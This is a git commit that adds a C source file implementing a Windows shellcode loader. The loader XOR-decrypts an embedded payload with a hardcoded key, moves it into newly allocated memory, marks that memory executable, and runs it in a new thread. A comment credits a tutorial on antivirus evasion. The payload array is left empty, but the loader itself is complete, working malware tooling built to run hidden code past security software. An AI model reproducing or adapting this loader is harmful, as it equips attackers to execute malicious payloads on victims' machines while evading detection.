b148a2a36b40cd35f214b082c1f8bf45451c5d01
shEep <80027135+fAtshEep-A@users.noreply.github.com>
2023-05-29 14:18:52 +0800

    Create v1Simple_Ldr.c

---
+++ v1Simple_Ldr.c
@@ -0,0 +1,45 @@
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+unsigned char my_payload[] = {};
+unsigned int my_payload_len = sizeof(my_payload);
+
+char my_secret_key[] = "mysupersecretkey";
+
+void XOR(char * data, size_t data_len, char * key, size_t key_len) {
+    int j;
+    j = 0;
+    for (int i = 0; i < data_len; i++) {
+            if (j == key_len - 1) j = 0;
+
+            data[i] = data[i] ^ key[j];
+            j++;
+    }
+}
+
+
+int main(void) {
+  void * my_payload_mem;
+  BOOL rv;
+  HANDLE th;
+  DWORD oldprotect = 0;
+
+  my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+  XOR((char *) my_payload, my_payload_len, my_secret_key, sizeof(my_secret_key));
+  
+  RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
+
+  rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
+  if ( rv != 0 ) { //change memory success or false
+    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
+    WaitForSingleObject(th, -1);//use thread to run shellcode
+    //have a lot of method to run our shellcode
+  }
+  return 0;
+}
+
+//this is a simple loader from cocomelonc
+//https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html
